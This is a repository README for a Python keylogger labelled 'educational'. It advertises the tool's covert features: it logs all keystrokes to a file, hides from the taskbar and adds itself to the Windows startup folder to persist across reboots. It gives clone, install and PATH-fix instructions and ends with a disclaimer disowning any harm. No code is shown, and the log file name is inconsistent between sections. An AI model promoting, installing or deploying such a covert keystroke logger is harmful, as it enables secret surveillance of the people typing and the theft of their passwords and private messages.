# Keystroke Logger (Educational Purposes)

This Python script continuously logs keystrokes to a file and runs in the background without appearing in the taskbar. It saves all recorded keystrokes to `keystrokes.txt` when the program exits. Additionally, it sets up auto-startup on system startup.

## Features

- Logs all keystrokes to `keystrokes.txt`.
- Runs in the background without appearing in the taskbar.
- Saves all recorded keystrokes when the program exits.
- Auto-starts on system startup.

## Installation

1. Clone or download this repository.

```bash
git clone https://github.com/NexxussExploits/keystroke.git
```
Install the required Python libraries:
```bash
pip install pynput pystray
```
Replace "icon.png" with the path to your desired icon file.

Run the script:
```bash
python keylogger.py
```
Auto-start on System Startup (Windows)
After running the script once, a shortcut named KeystrokeLogger.lnk will be created in the Windows startup folder.

The script will now run automatically on system startup.

Usage
The script continuously logs keystrokes to keystrokes.log.
To exit the program, right-click the system tray icon and select "Exit".
Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.


## IF INSTALLATION DOESN'T WORK:
If you've completed the Python installation and you're still encountering the "pip is not recognized" error, it likely means that the Python Scripts directory, which contains the pip executable, is not added to your system's PATH environment variable.

Here's how you can fix it:

Locate the Python Scripts directory: This directory is typically located within your Python installation directory. If you installed Python using default settings, it might be located at C:\Python\Scripts or C:\Users\YourUsername\AppData\Local\Programs\Python\PythonXX\Scripts, where XX represents the Python version number.

Add Python Scripts directory to PATH:

Right-click on "This PC" or "My Computer" and select "Properties".
Click on "Advanced system settings" on the left.
In the System Properties window, click on the "Environment Variables" button.
In the Environment Variables window, under "System variables", find the Path variable and select it, then click on the "Edit" button.
Click on the "New" button and add the path to the Python Scripts directory.
Click "OK" on all windows to save your changes.
Restart your command prompt: After making these changes, close and reopen your command prompt or terminal window. Now you should be able to use pip without encountering the "not recognized" error.

After completing these steps, running pip install pynput pystray should work as expected. Let me know if you encounter any issues!

## REMEMBER THIS IS FOR EDUCATIONAL PURPOSES ONLY. ANY HARM CAUSED IS NOT MY FAULT AND YOU CAN BE PUNISHED BY LAW IF USED INPROPERLY.
